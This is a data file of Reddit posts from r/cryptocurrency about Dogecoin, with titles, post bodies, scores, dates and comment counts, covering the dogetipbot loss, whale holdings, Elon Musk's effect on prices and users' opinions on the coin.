DOGE,cryptocurrency,"Back in the day on Reddit dogecoin tipping bot was popular and Redditors used it to tip others. However, one day in 2017 bot owner made a post that they sold all of users' Doge to fund their personal failures. 109 million doge from 84k accounts was stolen, worth $6.7 mill now or $80 mill during ATH","Since I couldn't fit everything in the title I am adding that at the time that this person said user's funds are forever lost, that amount of Doge (in May 2017) was worth around $130k+, so even then it was not a small chunk of money at all. Some users even at that point had over $500 of Doge on their balance.  This is the post the creator of dogecoin tip bot made to justify his actions: https://np.reddit.com/r/dogecoin/comments/69vycc/important_im_taking_dogetipbot_to_a_server_farm/   So in the whole post he did not really even fully apologize to people, but it felt like that post was made more as an attempt to feel sorry for him. As if he was close to bankruptcy, had to layoff some workers (all types of excuses) so had to take all of the doge from the balances. Exact amount of Doge that was there was 108,911,472.26171964 DOGE from 84,671 accounts in total. That means average user had on balance around 1300 DOGE. That would've been worth over $900 during its ATHs.  A lot of users had pretty huge balances on the dogecointipbot that they did not withdrew which were just wiped out aka stolen by the creator, so they must have felt a great amount of anger when May 2021 hit and Doge reached heights of over $0.7. Some folks had more than 100k Doge on their balances that they thought was safe, and that the person running the dogecointipbot was trustworthy. A lot of that stolen money could have been life changing to people that this was stolen from.  It is even more ridiculous reading some comments in the original post and seeing how he emotionally duped a lot of people as if he's some sort of a victim in this whole story, when in the end all he did was stole other people's crypto and financed their own personal ventures with it.",433,2023-09-20 07:58:40,319
DOGE,cryptocurrency,Is the Era of Dogecoin over?,"I've been watching Dogecoin for quite a while now, it's what brought me into crypto (a little over an year ago!).  Anyways, ever since the grand slam dump of a fall from what was an astonishing number for a coin like doge, It has been in a constant downtrend ever since. Now currently at $0.122 from it's ath of $0.68, thats a fall of nearly 70%!  [Consistent downtrend \(1D chart\)](https://preview.redd.it/kadgk0cpelk81.png?width=891&format=png&auto=webp&s=15f4b2d6d0c637c624ea0a2c22859b6dea2952b7)  There have been minor jumps and pumps along the way, but after every single jump, there's a even bigger dump. The gap between pumps have been becoming higher and higher, and the duration of the pump has shown to be shortening over time.  Is it safe to say the era of not memecoins, but dogecoin in reference is over? I honestly don't think Elon or anyone for that matter would be able to bring back the hype of dogecoin as it was back in May. I personally know many people who bought at the top and still hold for the ""$1 dogecoin!"" line.   I although did hold through .07 and saw my investment hit the multi-thousands. I didn't sell because of that line, my knowledge in cryptocurrency tokenomics has a huge role in my decision making. I'm still baffled that Dogecoin managed to pull off being in Top 3 cryptocurrencies, when you look at it now. That's crazy!  Anyways, just wanted to discuss my thoughts. What do you think? I don't think doge will ever go back up aside from the little pumps it may have, definitely not close to where it was at it's highest.",631,2022-02-28 15:37:41,621
DOGE,cryptocurrency,FYI just one single address owns 28% of all Dogecoins in existance. That alone should worry anybody.,"Since Dogecoin has been talked a lot here on this sub today and many people have come supporting it or attacking it, it is worth noting that one single investor owns more than a quarter of all Dogecoins in existence.  >A dogecoin ""whale"" owns 28% of the meme-based token, according to a report from the Wall Street Journal.   >Records reveal that 28% of the cryptocurrency in circulation is owned by a single investor, though the person or entity has not been identified.  https://markets.businessinsider.com/currencies/news/dogecoin-biggest-holder-owns-28-of-the-cryptocurrency-2021-2-1030093749  You might have made a lot of money of it, but I think that a single person owning so much it's at the very least a serious redflag.  EDIT: [This is the address in question](https://dogechain.info/address/DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L). Many have said that it is from Robinhood. While it is possible because of the amount of money it has, **the address has only received 878 transactions and has only sent 21 transactions.** Very unusual for an exchange address.",1069,2021-04-15 20:29:32,376
DOGE,cryptocurrency,Tesla to accept Dogecoin!,,596,2022-01-14 05:06:59,722
DOGE,cryptocurrency,Elon Musk posted a Scooby-Doo memeâ€”and Dogecoin added $320 million in 15 minutes,,352,2023-07-20 07:01:08,422
DOGE,cryptocurrency,"Dogecoin: Who Buys It, Why It Will Fail, and Why It Bothers Me","Woof. Okay. Iâ€™ve had enough. So Iâ€™ve decided to finally put this down into an original post.   **Iâ€™m going to tell you (A) The people who buy Dogecoin, (B) Why it will fail, and (C) Why it bothers me.**  **(A) The people who buy Dogecoin**    **A1) The crypto n00b/amateur.** These people were not involved in the last bull market, have no idea how many Dogecoins there are, donâ€™t know how the Dogecoin network is â€œsecuredâ€, think BTC is too expensive, want to get rich quick and think they are getting in early. Most heard about it from a friend who put $100 in and made a few thousand. Some actually believe Doge is the new BTC (lol, ouch). They will ride Dogecoin down in the bear market and get REKT as fuck.     **A2) The day trader.** These people think they can consistently beat the base rate of simply HODLing BTC and paying capital gains taxes on each trade. Many probably cheat on taxes. Most donâ€™t make much $. They donâ€™t care about any of the technology although some may understand peripherally. They will attempt to buy low and 3-5x their profits and then GTFO. They will never ride their coins down all the way in a crash.     **A3) The OG doge people.** Many of these people probably have large stashes of non-joke coins like BTC, ETH, etc. A few of them have massive %s of all the Dogecoins in existence. They will slowly dump their bags on the above classes and put it into USD or BTC so they wonâ€™t lose their paper millions/billions in the inevitable crash.   **(B) Why Dogecoin will â€œfailâ€ and crash**     **B1) The network is incredibly vulnerable to attack and nowhere near a stable store of value because of it.** The hash rate backing it is pathetically small and there is little to no development supporting itâ€¦         **See EDIT2 at end ðŸ˜‡. Apparently itâ€™s not so vulnerable because itâ€™s tied to Litecoin mining which is secure**     **B2) There is no development on this network.** Fact. Conversely, there is immense amounts of development happening in other projects; development which solves real problems, enhances decentralization, secures billions of real dollars of value, etc     **edit: apparently there is a small amount of dev now happening. After several years dormant...**     **B3) It has gone up so fast, people have such huge paper gains that sooner or later they will cash them out**     **B4) There are 120 BILLION coins, and 14 million new ones per day.** Thatâ€™s about 4% inflation guaranteed for a decade or two. This type of inflation may be fine for fed coins and government fiat but why the fuck would anyone want it for a future store of value or currency? LOL much no thank you.     **edit: 4% and slightly decreasing over time**     **B5) Institutions will never buy this for reasons B1-4 above (and many more).** You cannot sustain market caps in the hundreds of billions of dollars without institutions.   **(C) Why it bothers me**     **C1) People who donâ€™t know better will get rekt and turned off cRyPto.** Then maybe theyâ€™d support fed coin when it comes out and might even support a ban on Bitcoin (should that ever become politically feasible). Theyâ€™ll miss the true opportunity that is here and allow rich people and institutions to have more of the pie.     **C2) Nobody crypto-competent would buy and hold Doge, yet people like the Winklevoss twins and other big exchanges are shilling doge coin listings to grab a slice of the trading fees.** They are peddling trash they would never hold themselves to make a quick buck. Sound familiar? Just like todayâ€™s big banking system most everyone on here detests.     **C3) Itâ€™s so lazy. Itâ€™s obviously not the next Bitcoin.** Do a little research and youâ€™ll know itâ€™s a joke. *It is a fork of a fork OF A FORK of Bitcoin*. The real deal is sitting there in plain sight, butâ€¦     **C4) Unit bias is so real, WOW.** Bitcoin is perceived as too expensive. Itâ€™s really sad how human brains fall victim to this extremely well known and obviously-occurring-right-now bias.     **C5) This may cause a regulatory backlash on legitimate projects.** Puke. The last thing we need is excessive gov regulation around this market. But when misinformed lazy people lose significant amounts in a joke meme project like Dogecoin, you better believe there will be calls to step in.     **C6) Elon is a narcissistic deuchebag.** Do you really want a narcissistic billionaire in charge of the future of money? No. I want nobody in charge. I want a leaderless, headless, consensus driven decentralized network instead.   If you have Dogecoin and read this far, bravo, Iâ€™m impressed.  **If you are a supporter of real blockchain projects (perhaps aligning with beautiful philosophical goals) and want to help ensure they succeed and arenâ€™t stopped by the dark forces that be, then itâ€™s incumbent on you too to help this revolution succeed. That means stopping scammers and combatting false narratives.**  Rant over. I wish everyone a great bull market part two after this intermission. Have fun staying rich/poor.   Cheers yâ€™all! ðŸ» ðŸ–¤    PS: In anticipation of the incoming brain-dead-level attack comments... **Iâ€™m not mad about your paper gains bro.** ðŸ‘¹  WOW   **EDIT1: this direct message is why I post this: â€œHeya wanted to say thanks for that enlightening post  I'm new into crypto and love when I see honest and informative posts. You don't know who and what to believe anymore.â€**  **EDIT2: apparently litecoin mining (which doge is piggybacked on) is called Scrypt and it is much harder to 51% attack than I thought. Iâ€™ll look into it more.**  **EDIT3: I want all of crypto to succeed and I want everyone to win. If doge helps people get into crypto then great. Then maybe theyâ€™ll learn more about other projects that are actually doing things.**  **I wish everyone the best just be responsible and stop thinking me pointing out obvious flaws with your pet project are me being toxic lol... itâ€™s sharing pretty much undeniable information; sorry.**",707,2021-05-20 12:22:55,698
DOGE,cryptocurrency,Elon Musk denies owning Dogecoin wallets amid lawsuit alleging insider trading,,591,2023-06-16 13:22:57,234
DOGE,cryptocurrency,"Whale purchases for $31.6 million, 400 million Dogecoin",,833,2022-06-10 11:35:43,278
DOGE,cryptocurrency,Dogecoin Down 20% from Last Week as Hype dies Down,,752,2021-07-16 14:38:43,495
DOGE,cryptocurrency,Dogecoin Down Over 90% Since Elon Musk's SNL Appearance,,1103,2022-06-13 02:53:34,189
DOGE,cryptocurrency,DogeCoin is pumping. And itâ€™s highly centralized with one address owning 27% of the supply.,"Do people understand DogeCoin is highly concentrated with 27% of the supply held in a single address?  Warning: Dogecoin, the coin that Elon Musk likes to pump is highly concentrated with one address owning 27% of the supply.  You read that right, a single Dogecoin address is holding 27%:   https://decrypt.co/56616/what-we-know-about-the-dogecoin-address-that-holds-27-of-its-supply  This goes against cryptos general decentralization efforts and has even prompted the CEO of Binance to raise some concerns:  https://twitter.com/cz_binance/status/1357259732000538628  â€œRisks: 1 address holds 27% of all #DOGE.  Top 20 addresses holds more than 50%+ of all #DOGE Kinda ""centralized"" in that sense.â€  It is not entirely clear if this address is abandoned or active, but it raises legitimate concerns about a super-whale cashing out and becoming a fiat billionaire, as well as leaving many crypto enthusiasts holding the bag. If you invest in dogecoin, invest with this risk in mind.",755,2021-05-05 01:51:31,508
DOGE,cryptocurrency,Robinhood warns it could be hurt if interest in Dogecoin wanes,,789,2021-07-02 01:21:06,422
DOGE,cryptocurrency,Elon Musk offers one million Dogecoin to anyone who can provide evidence of emerald mine rumor,,439,2023-04-13 21:02:14,320
DOGE,cryptocurrency,"Dogecoin, after all these years, you still offer us 1 minute transactions for only 2 cents! wow. much thanks. so fast. so shill",,1812,2018-01-05 12:18:08,287
DOGE,cryptocurrency,Meme Coins Dogecoin And Shiba Inu Record Highest Losses As Crypto Trading Volume Tanked,,706,2021-07-15 13:32:13,465
DOGE,cryptocurrency,'The Big Short' investor Michael Burry dismisses shiba inu coin as 'pointless' - noting the dogecoin spinoff's supply exceeds 1 quadrillion coins,,707,2021-10-09 12:10:45,379
DOGE,cryptocurrency,"AMC now Begins Accepting Bitcoin, Ethereum And 2 Other Cryptos, CEO Says 'Dogecoin Next'",,755,2021-11-12 02:26:15,323
DOGE,cryptocurrency,Dogecoin dev team responds to pump & dump organizers asking them to set a max supply cap on their Github,"https://github.com/dogecoin/dogecoin/issues/1674  >We believe that what you're really doing is trying to get rich at the cost of others and when that failed because you ran out of victims and money, you come here asking us to bail you out. However, we will not bail you out, as with great freedom comes great responsibility. We take ours seriously and we hope that you will too in the future. We have now closed this topic. Request denied.  I messaged the modteam over at r/dogecoin mentioning that it would be a very responsible move of them to let the community know that this is the engineering team's official stance. A lot of new users are banking on this occurring, as pump & dump groups have convinced them that if it does their investment is going to skyrocket.  Not holding my breath, though.",1031,2021-02-01 23:54:43,266
DOGE,cryptocurrency,Elon Musk Reaffirms Offer to Eat Happy Meal on TV if McDonald's Accepts Dogecoin,,410,2023-01-29 04:44:41,344
DOGE,cryptocurrency,"First Dogecoin transaction without internet sent via RadioDOGE, marking historic moment",,735,2022-04-22 13:35:49,251
DOGE,cryptocurrency,Dogecoin Price Jumps 25% To Lead Market Gains,,150,2024-11-07 02:16:52,92
DOGE,cryptocurrency,"DOGE pumped 25% and then dumped 13% in just hours on Monday when Twitter erratically changed their logo, causing almost $20 million in both long and short liquidations on Dogecoin alone. Market-wide liquidations of $170M","Dogecoin pumped 25% in a few hours and so far then gave back much of these gains on Monday when Twitter changed their logo to the Dogecoin logo. The rest of the market  has remained largely unchanged during the pump but fell as Dogecoin began to fall as well. It is ridiculous, very questionable and outright dangerous the influence that Elon Musk has.  On **Dogecoin alone**, the market saw liquidations of almost 10 Million on both longs  and shorts, as shorts were liquidated on the way up and longs on the way down. A truly brutal day for dogecoin leverage players. Meanwhile most of the rest of the market, interestingly, just stood by and watched it  all unfold changing little in their gains during the pump but started seeing some red as Dogecoin began to fall in price, though not nearly to the same degree as Dogecoin.  &#x200B;  https://preview.redd.it/05tyg9p235sa1.png?width=246&format=png&auto=webp&s=001ca7080a5b397e7de4bc261ab3a836aeec9c5e  &#x200B;  https://preview.redd.it/ot86qqq335sa1.png?width=139&format=png&auto=webp&s=77bf91770d9f296ded39332d83f1b433982679c5  Dogecoin has managed to hold onto most of its gains till today after recovering somewhat. And the Twitter logo **still** remains the Dogecoin logo. When does it end?  Data sourced per Coinglass",397,2023-04-05 22:17:21,265
DOGE,cryptocurrency,Elon Musk says Dogecoin is the best cryptocurrency,,1375,2020-03-03 12:25:02,200
DOGE,cryptocurrency,Dogecoin Down 11% After Twitter Poll Says Elon Musk Should Leave CEO Post,,707,2022-12-20 06:14:42,161
DOGE,cryptocurrency,"Elon Musk runs a poll on Twitter, asking whether Tesla should accept Dogecoin",,652,2021-05-11 08:23:16,363
DOGE,cryptocurrency,Dogecoin is dead! Itâ€™s a good thing too.,"While almost every coin is up hella over the last 2 weeks, doge is stuck at 19-20 centsðŸ˜‚   I think doge brought in a ton of new people to crypto including myself and during this dip over the last few months most of us studied up and realized itâ€™s a shit coin and have pulled our money out and invested in quality projects!   Thank you doge for bringing me into crypto and snatching 50 percent of my portfolio and teaching me how to get that 50 percent back by not investing in you anymoreðŸ˜‚   Edit: a lot of you are missing the point but I would expect nothing less from Reddit.  My point is the hype is dead. And most of the investors have realized there are much better projects to invest in instead of doge which is why we are seeing most legit projects pump these last two weeks while doge stays stagnant.   This does not mean doge will never go up again. Iâ€™m sure it will go up during the next bull run as almost all coins will. But I still think itâ€™s a shit coin in comparison to other top tier coins out.   Also this is my first ever post in this subreddit and itâ€™s about my own personal experience. Itâ€™s not a damn moon farming post Iâ€™m actually surprised itâ€™s gotten this much traction. I appreciate all the comments, especially the hateðŸ˜‚",326,2021-08-05 03:02:19,1093
DOGE,cryptocurrency,This â€˜dogecoin millionaireâ€™ Glauber Contessoto now plans to go â€œall inâ€ on Cardano blockchain and its altcoin ADA,,506,2021-08-26 16:18:29,438
DOGE,cryptocurrency,Mark Cuban Still Loves Dogecoin But â€˜Every Meme Coin Is a Rug Pull in the Worksâ€™,,276,2024-10-03 18:36:02,66
DOGE,cryptocurrency,What is Dogecoin? Why is Dogecoin? How is Dogecoin? Everything you need to know in 5 minutes or less.,"Even though you probably won't admit it, you are secretly holding thousands of Doge hoping that one day it will hit $1 and make your dreams come true.  #**What is Dogecoin?**  Dogecoin was co-founded by IBM software engineer Billy Markus and Adobe software engineer Jackson Palmer, who set out to create a peer-to-peer digital currency that could reach a broader demographic than Bitcoin.  ***Full story and a lot of interesting stuff can be found on the [Wiki page](https://en.wikipedia.org/wiki/Dogecoin)*.**  In the beginning, there were only 100 Billion Doge, and all of them were mined in just two years. After that, the code was updated and another 5 Billion Doge were to be created every year making Doge a currency with infinite supply somewhere in 2015. As documented by [mainstream media](https://arstechnica.com/information-technology/2014/02/dogecoin-to-allow-annual-inflation-of-5-billion-coins-each-year-forever/), some community members disliked this decision and complained that their investment will go to zero while others supported the unlimited supply because true Doge believers don't care about USD value. With all those new digital assets emerging from nowhere the internet needed a currency and Doge filled that gap.  #**Why is Dogecoin?**  If Bitcoin ever goes mainstream you probably won't be able to purchase a whole Bitcoin ever again. Sats would become the standard and value should (in theory) constantly keep going up because network usage will need to keep going up as well. Now imagine that you actually held through hell and back, waited for Bitcoin to hit millions just to lose your private keys however that may happen. No one would be able to recover that capital and you would find it hard to get a new reason to move on. With infinite inflation, things look a bit different.  Scarcity rewards those that get in early and hold on to that currency until demand increases significantly. Doge, on the other hand, incentivizes spending and transacting making it an actual currency. 5 Billion coins per year do sound like a lot but it makes perfect sense in the long run. For example, if you have 100 coins and add 100 more the next year your inflation rate would be 100% but as time passes that percentage will decrease due to the increase in supply. In 100 years your inflation rate is only 1% and still decreasing. To put it simply, Bitcoin is an asset that is expected to have an increase in demand within the next few years or decades while Dogecoin is a currency that aims to provide fast, easy, and cheap value transfers in everyday transactions. If Bitcoin is used to store value, Dogecoin is a tool to quickly and cheaply transfer that value.  #**How is Dogecoin?**  Dogecoin was created as a fork of Litecoin and is also [secured by miners](https://www.coinwarz.com/mining/dogecoin/hashrate-chart). It has a much faster block time than LTC of just 1 minute, which made Dogecoin one of the fastest and cheapest currencies to transact with back in the ""old days"". It recently spiked in popularity thanks to Elon Musk and TikTok but if you actually follow the [Dogecoin subreddit](https://np.reddit.com/r/dogecoin/) you will notice that they don't care much about your price speculation. As long as 1 Doge = 1 Doge no one is complaining. In terms of development, there hasn't been a single major update since 2015 but we did make it to [NASCAR](https://www.theguardian.com/technology/2014/mar/27/nascar-dogecoin-sponsor-josh-wise-talladega-superspeedway). As far as network usage goes, Dogecoin [averages](https://bitinfocharts.com/dogecoin/) about 1.3k per hour compared to 14k on the Bitcoin network.  So how is Dogecoin? Same as usual I guess.",1197,2021-01-14 11:47:05,175
DOGE,cryptocurrency,I just had to declare my Dogecoin holdings to my employer ðŸ˜…,"I just started a new job at a fintech company and I'm required to disclose all my financial holdings. The recruiter asked me ""So what cryptos do you have BTC, ETH, LTC"" and I had to say ""no, All my crypto is in Dogecoin""   edit: for all those doubting Doge: https://www.youtube.com/watch?v=000al7ru3ms",1186,2019-08-01 16:10:00,234
DOGE,cryptocurrency,"You always hear about the guy who made $100K by betting $100. You never hear about those who risked thousands and are left with nothing. Out of 40,000+ coins analyzed over the past 10 years, only 1.7% delivered a 100x return!","Hereâ€™s the hard truth about investing:  *You always hear about the guy who made $100K by betting $100. You never hear about those who put in thousands and are left with nothing.*  All of us have at least once wished we had made a similar play to the one thatÂ [turned $17 into \~6M](https://www.benzinga.com/markets/cryptocurrency/21/05/21076574/he-invested-17-in-shiba-inu-now-he-has-almost-6m)[.](https://www.cnbc.com/2021/07/06/millennial-dogecoin-millionaire-on-being-paid-in-dogecoin.html)Â More than 2.1 million people right now are trying to find theÂ next crypto moonshot. Even the CEO of Coinbase isÂ toutingÂ how if someone had bought $100 Bitcoin when Coinbase was founded, it would be worth $1.5 million today.  With all thatâ€™s going on, whatâ€™s the actual probability of getting a 100x return on your investment in the crypto world?  # What are the odds that you will lose 100% of your investment?  Of the more than 40,000 coins that traded in an exchange at least once in the last 10 years, only 38% are still alive. So forget about making a profit â€” the probability that the coin you buy will survive over the long run is only \~ 1 in 3.  [Total number of coins: 40,399 | Source: Market Sentiment Research, CoinGecko](https://preview.redd.it/3den43lgi66e1.png?width=779&format=png&auto=webp&s=f13079314237019897f6099b094b53cc56c4425d)  # What about 100â€™xing your investment?  While there are probably hundredsÂ *(even thousands)*Â of coins that might have 100â€™xed in value during their brief existenceÂ *(like theÂ Hawk TuahÂ coin)*, itâ€™s unrealistic to expect to find them and invest in them before someone rug pulls them out of existence.  To get a more realistic scenario, we kept a minimum market cap limit of $10 Million and required the coin to be present in the top 100 coins based on market cap.  The backtest is simple â€” At the beginning of every monthÂ *(starting in 2014)*, we check what the top 100 most popular coins were and the probability that you would have 100â€™xed your investment if you held on to that coinÂ *(*[data here](https://docs.google.com/spreadsheets/d/1r-3jqju58bfewDd2GxfH0jd0woO2kSKYEodFYkf6JB0/edit?usp=sharing)*).*  In the last 10 years, there were a total of 9,502 coins that fit our criteria. Out of these, only 442Â *(4.6%)*Â grew more than 100x. This assumes that you sold at the very top. If you had held on to these coins to date, the number drops to 160.  **So, over the holding period, the chance that you 100â€™xed your investment on a coin is only 1.7%.**  If you remove the duplicatesÂ *(as the same coin can come up in our filter in different months),*Â of the 460 cryptocurrencies that made it into the list, only 38Â *(8%)*Â grew more than 100x. If you held on till 2024, only 8 coinsÂ *(1.7%)*Â provided you with a 100x return.  >  If you are calculating the expected value and think that you will come out aheadÂ *(given you have a \~2% chance of 100x returns)*, you must read [our research on Kelly Criterion.](https://www.marketsentiment.co/p/the-problem-with-averages)  For those who are determined to try to win, here are a few things to consider:  1. **Be aware of the odds**Â â€” The chance of you hitting a 100x return on your meme coin investment is less than 1 in 50. To put this in perspective, itâ€™s like picking a specific card out of a shuffled deck of cards on your first try! 2. **Spread your bets â€”**Â The best way to improve your odds of winning is to survive. You can reduce your risk and improve your returns byÂ [diversifying and making smart bet sizes.](https://www.marketsentiment.co/p/shannons-demon)",2512,2024-12-11 08:24:03,423
DOGE,cryptocurrency,"Twitter Reportedly Halts Work on Crypto Wallet, Driving Dogecoin Down 10%",,368,2022-11-04 03:50:07,309
DOGE,cryptocurrency,"After Almost Nine Years, a Dormant Dogecoin Wallet Moves 2.37 Million DOGE",,449,2022-11-02 12:15:10,246
DOGE,cryptocurrency,Elon Muskâ€™s The Boring Company Now Accepts Dogecoin for Rides ðŸš‡,,210,2024-11-23 12:54:35,54
DOGE,cryptocurrency,"Bitcoin, Ethereum, Dogecoin Begin 'Uptober' Deep In The Red, But Traders See This As The 'Final Shakeout'",,213,2024-10-02 06:22:22,70
DOGE,cryptocurrency,Reallyâ€¦? Dogecoin is Processing 300% More Transactions than Bitcoin Cash (Finance Magnates),,763,2018-06-19 08:51:27,439
DOGE,cryptocurrency,Elon Musk Accused by More People of Running Dogecoin Pyramid Scheme; Know Details,,354,2023-04-08 12:18:54,209
DOGE,cryptocurrency,"Dogecoin Co-Founder Billy Markus Calls Out DOGE Community, Says They Do Nothing Productive",,171,2023-10-12 21:07:11,224
DOGE,cryptocurrency,I hate Dogecoin because of its fanbase.,"I had nothing against Dogecoin. To be honest, I liked it because it was the most popular meme coin these last years and the community seemed really cool - until Elon Musk started to talk about it (at least, that's why I think it became so annoying).  **EVERY POST** involving crypto (in some cases not even involving it), especially posts by Elon Musk, there are these people spamming dumb shit about this doggy coin.  One of the most famous figures I've noticed is [Matt Wallece](https://twitter.com/MattWallace888). Just take a look at his tweets history and you will understand what I'm saying - and he is just one of them.  I'm annoyed of Dogecoin because of these people. How can your life be resumed by *convincing people all the time* that there's a crypto out there that is worth paying for?  Edit: Yeah, hate is a strong word. I don't hate it, but I'm sick of reading Dogecoin everywhere.  https://preview.redd.it/pitnyb9i9px81.png?width=602&format=png&auto=webp&s=266b2d50b90bf2cbc2f61148f8fbbcb9f1d28ff7",414,2022-05-05 18:28:09,275
